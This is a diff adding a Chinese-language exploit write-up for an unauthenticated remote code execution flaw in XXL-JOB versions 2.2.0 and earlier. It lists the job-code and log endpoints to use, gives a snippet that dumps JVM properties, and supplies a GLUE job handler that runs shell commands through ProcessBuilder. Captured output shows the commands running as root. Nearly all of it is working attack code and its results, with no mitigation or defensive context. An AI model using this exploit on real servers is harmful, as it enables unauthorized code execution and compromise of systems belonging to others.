@@ -1,5 +1,55 @@
 # xxl-job 执行器 RESTful API 未授权访问 RCE
 
+### 利用 执行日志Console 可获取命令执行成功结果：
+
+Example:
+
+```/joblog/logDetailPage?id=xxxx```
+
+#### 查看jdk环境变量
+```
+String var3 = System.getProperties().toString();
+System.out.println(var3);
+```
+
+#### 命令执行
+
+
+`/jobcode?jobId=x`
+
+```
+
+import com.xxl.job.core.log.XxlJobLogger;
+import com.xxl.job.core.biz.model.ReturnT;
+import com.xxl.job.core.handler.IJobHandler;
+
+public class DemoGlueJobHandler extends IJobHandler {
+
+    @Override
+    public ReturnT<String> execute(String param) throws Exception {
+        XxlJobLogger.log("XXL-JOB, Hello World.");
+        String cmd = "whoami&&id";
+        String var2 = new java.util.Scanner(new java.lang.ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next();
+        System.out.println(var2);
+        return var2;
+    }
+
+
+}
+```
+
+```
+----------- JobThread Exception:org.codehaus.groovy.runtime.typehandling.GroovyCastException: Cannot cast object 'uid=0(root) gid=0(root) groups=0(root)
+' with class 'java.lang.String' to class 'com.xxl.job.core.biz.model.ReturnT'
+	at org.codehaus.groovy.runtime.typehandling.DefaultTypeTransformation.continueCastOnSAM(DefaultTypeTransformation.java:415)
+	at org.codehaus.groovy.runtime.typehandling.DefaultTypeTransformation.continueCastOnNumber(DefaultTypeTransformation.java:329)
+	at org.codehaus.groovy.runtime.typehandling.DefaultTypeTransformation.castToType(DefaultTypeTransformation.java:243)
+	at org.codehaus.groovy.runtime.ScriptBytecodeAdapter.castToType(ScriptBytecodeAdapter.java:615)
+	at DemoGlueJobHandler.execute(script16251277854351238137335.groovy:13)
+	at com.xxl.job.core.handler.impl.GlueJobHandler.execute(GlueJobHandler.java:26)
+	at com.xxl.job.core.thread.JobThread.run(JobThread.java:152)
+```
+
 `XXL-JOB <= 2.2.0`
 
 ![](./xxl-job.gif)
